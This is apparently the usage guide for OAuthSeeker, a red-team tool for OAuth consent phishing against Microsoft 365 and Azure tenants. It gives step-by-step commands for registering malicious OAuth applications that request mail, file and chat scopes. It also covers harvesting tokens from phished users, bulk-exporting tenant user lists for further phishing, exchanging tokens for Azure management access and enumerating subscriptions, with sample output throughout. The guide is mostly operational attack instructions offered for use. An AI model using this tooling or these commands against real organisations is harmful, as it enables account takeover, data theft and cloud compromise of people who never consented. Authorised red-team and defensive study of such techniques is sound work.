# Overview

OAuthSeeker has three primary deployment modes/use-cases that can be leveraged during red team engagements. These can be broken down into three scenarios referred to as external unverified application, internal unverified application, and external verified application. In this guide we discuss each of these exploitation steps in-depth including the possible attack paths from each perspective and the steps required to configure an application under each condition. 

# Exploitation Scenarios

The diagram given below shows the various attack paths that are possible from various positions leveraging a malicious OAuth application under the previusly mentioned three exploitation scenarios of external unverified application, internal unverified application, and external verified application. The most common scenarios are either going to be leveraging this capability to obtain initial access through either an unverified or verified external application. For an unverified external application this just gives you the ability to list users, but if the tenant permits installation of external verified applications (the default setting) you can trick a user into installing an external verified application to gain access to their Office365 and Azure resources. 

The other common use-case is after gaining internal access you can leverage the ability for unprivileged users to create internal unverified OAuth applications to perform internal phishing to compromise other users within the tenant. Unfortunately, this isn't possible for the context of a verified external application since the ability to create new OAuth applications within a tenant requires admin consent for approval. However, it would be possible to pivot into internal phishing with an unverified internal OAuth application after gaining initial access through another method such as through a device code phishing attack. 

![OAuthAttackPaths](https://github.com/user-attachments/assets/275b8937-1402-4ce2-91c0-5f3eb9fa39e0)

*For additional insights, check out this related blog post on creating a malicious Azure AD OAuth2 application: [Creating a Malicious Azure AD OAuth2 Application](https://trustedsec.com/blog/creating-a-malicious-azure-ad-oauth2-application).*

# Setting Up an OAuthSeeker Instance

In this section, we discuss how to perform phishing using OAuth applications to achieve initial access within an environment. The setup process is idential for our three use-cases of an external unverified application, internal unverified application, or an external verified application. There are just some small differences in behavior such as if you are setting up an internal unveriied application you will need a JWT for your compromised user account within the victim tenant or with a verified application after you provision and configure the instance you will need to submit a Microsoft Partner network identifier to verify the application.

## Provisioning a Phishing Domain
 
Before deploying OAuthSeeker we will need to provision a domain name which we can leverage within the application. This is because for external phishing attacks we need to leverage an HTTPS url for redirect_url because of security restrictions imposed by Microsoft. It's not necessary to leverage HTTPS when the redirect_url points to say http://localhost:8080/callback which is more useful in scenarios where you want to leverage OAuthSeeker as a covert persistence mechanism or for debugging purposes. If you attempt to leverage an HTTP redirect URL to authenticate to an external application you will see the following error message:

```
AADSTS500117: The reply uri specified in the request isn't using a secure scheme.
```

## Installing OAuthSeeker on a Virtual Machine

In this section we discuss the setup process for provisioning a new unverified OAuth application within your tenant. First, you will need to obtain a JWT for your account to leverage during the deployment process. This can typically be obtained by running the following command on a system where you are logged into the target tenant using the Azure command line interface:

```bash
$ export JWT=$(az account get-access-token --resource https://graph.microsoft.com | jq -r .accessToken)
```

OAuthSeeker can then be leveraged on the virtual machine with the setup command to provision a new OAuth application using the JWT obtained from the previous command. This command completes the entire registration process from registering a new OAuth application within Azure to provisioning a new systemd service on the virtual machine and generating a configuration file to be used by the application. An example setup command is shown below:

```bash
$ sudo ./oauthseeker-linux-amd64 setup --redirect_url https://example.com/signup --unverified --access_token $JWT --name "Example App"
Using User.ReadBasic.All scope

Application registered successfully:
Client ID: 1a2b3c4d-5e6f-7g8h-9i10-11j12k13l14m
Client Secret: [REDACTED]
Redirect URI: https://example.com/login

Configured scopes:
- User.ReadBasic.All

Finished Installing Systemd Service

Generating Credentials for Admin User
Admin username: admin
Admin password: [REDACTED]
OAuthSeeker service installed and started successfully
$
```

You will want to use different flags here depending on your use-case. For example, if you would to target both Graph API permissions as well as Azure user_impersonation privileges you will want to specify the `--azure` flag which registers the application to request impersonation privileges within Azure when the user authenticates. For external unverified applications you will want to specify the `--unverified` flag since the only allowed scope for these applications by default is going to be `User.ReadBasic.All` and this flag ensures that OAuthSeeker is configured to only request this permission within the application. If the `--scopes` flag isn't specified with a file listing specific Graph API scopes then the following default set of scopes will be requested:

- Mail.ReadWrite
- Files.ReadWrite.All
- User.ReadBasic.All
- Team.ReadBasic.All
- Chat.ReadWrite
- Sites.Read.All

A scopes.txt file is simply a list of scopes separated by newlines such as the following:

```
User.ReadBasic.All
Mail.Read
```

The `--scopes` file should only list Graph API permissions and if you would like to also request Azure user_impersonation privileges you will need to specify the `--azure` argument along with the customized `--scopes` flag for a custom list of graph scopes. 

## Post Exploitation Leveraging OAuthPillage Utility

After performing a phishing attack with OAuthSeeker it's then possible to leverage the JWT obtained through the phishing attack in the admin panel with the OAuthPillage utility to then bulk export information on all users within the tenant for further phishing attacks:

```bash
$ oauthpillage extract users --format csv --token $JWT
ID,Display Name,Given Name,Surname,User Principal Name,Mail,Mobile Phone,Business Phones,Job Title,Office Location,Department
[REDACTED],John Smith,John,Smith,john.smith@example.com,,,,,,
[REDACTED],Jane Doe,Jane,Doe,jane.doe@example.com,,,,,,
[...]
```

## Post Exploitation Leveraging OAuthAzure Utility

After an attacker gains initial access to a user's account while using the `--azure` flag to obtain the user_impersonation permission they can then leverage the OAuthAzure utility to exchange their Microsoft Graph token obtained from OAuthSeeker for a JWT that can be leveraged against the Microsoft Azure management interface. This allows the attacker to perform essentially the same operations they could normally be able to perform from the Microsoft Azure CLI such as creating, deleting, and managing virtual machines among other items.

To start, an attacker can leverage the `oauthazure exchange` command to exchange their graph token for an azure management token as shown in the following command:

```bash
$ oauthazure exchange $JWT $REFRESH --client-id [REDACTED] --client-secret [REDACTED]
Granted scopes: https://management.azure.com/user_impersonation https://management.azure.com/.default

New access token: [REDACTED]
$
```

After performing the exchange the attacker can then use the `oauthazure info` command to view information about the obtained token if they would like to confirm the token is actually targeted at the azure management interface:

```bash
$ oauthazure info $JWT
Token Information:
Username: [REDACTED]
Client ID: [REDACTED]
Tenant ID: [REDACTED]
Object ID: [REDACTED]
Audience: https://management.azure.com
Scopes: user_impersonation
Expires: 2025-01-08 18:05:47 +0000 WET
$
```

The attacker can then leverage the built-in `oauthazure enum` command to begin enumerating access the user has within various subscriptions within the target tenant:

```bash
$ oauthazure enum $JWT

=== Azure Tenant Information ===
Tenant ID: [REDACTED]

=== Subscriptions ===

[*] Subscription: Contoso Corporation Production ([REDACTED])

  [+] Resource Groups:
      - contoso-prod-eastus-001 (eastus)
      - contoso-monitoring-eastus-001 (eastus)
      - contoso-dev-eastus-001 (eastus)
      - contoso-monitoring-eastus-002 (eastus)
      - contoso-test-eastus-001 (eastus)
      - contoso-security-eastus-001 (eastus)
      - contoso-backup-eastus-001 (eastus)
$
```

# Listing Registered OAuth Applications

The list command allows you to view all OAuth applications registered within the tenant that are accessible to your current access token. This can be useful for identifying existing applications and managing multiple registrations. The output of this command includes the following information:

* Application name
* Client ID
* Object ID
* Creation date
* Sign-in audience type

Example listing command and output:

```bash
$ oauthseeker list --access_token $JWT

Name                                     Client ID                                Object ID                                Created              Sign-in Audience
-----------------------------------------------------------------------------------------------------------------------------------------------------------
Example App                              [REDACTED]                              [REDACTED]                              2024-11-04           AzureADMultipleOrgs
$
```

# Cleaning Up the Registered OAuth Application

If you have registered a malicious OAuth application in a victim user's tenant you can cleanup the application by using the following commands:

1. First, list all registered applications to find the Object ID of the application you want to remove:

```bash
oauthseeker list --access_token $JWT [--refresh_token $REFRESH_TOKEN]
```

2. Once you have identified the application to remove, use the `unregister` command with the Object ID:

```bash
oauthseeker unregister --app_id $APPID --access_token $JWT [--refresh_token $REFRESH_TOKEN]
```

Note: The `--refresh_token` parameter is optional for both commands. If provided, it will be used to automatically refresh the access token if it expires during the operation.

This will completely remove the Azure AD application registration and clean up all associated resources.

# Accessing the Admin Panel

The admin panel can be accessed only from specific addresses. By default, the following IP addresses are allowed access:

- 127.0.0.1 (localhost)
- ::1 (IPv6 localhost)
- Configured IP allowlist

The admin credentials are generated during installation or can be configured manually in the environment file. This behavior can be modified by tweaking the ADMIN_ALLOWLIST_IPS setting within oauthseeker.env.

# Tweaking Configuration Options

After installation, you can modify the OAuthSeeker configuration by editing the environment file located at /etc/oauthseeker/oauthseeker.env. After making changes, restart the service for them to take effect. You can monitor the service status and logs using standard systemd commands. By default you shouldn't need to modify any of these configuration options, but it's useful to be aware where and how they can be modified. 

Example configuration modification process:

```bash
$ sudo vim /etc/oauthseeker/oauthseeker.env 
$ sudo service oauthseeker restart
$ journalctl -u oauthseeker
...
Nov 04 21:56:56 oauthseeker-testing oauthseeker[1015]: 2024/11/04 21:56:56 Database setup complete.
Nov 04 21:56:56 oauthseeker-testing oauthseeker[1015]: 2024/11/04 21:56:56 Starting HTTP server on :80
$
```
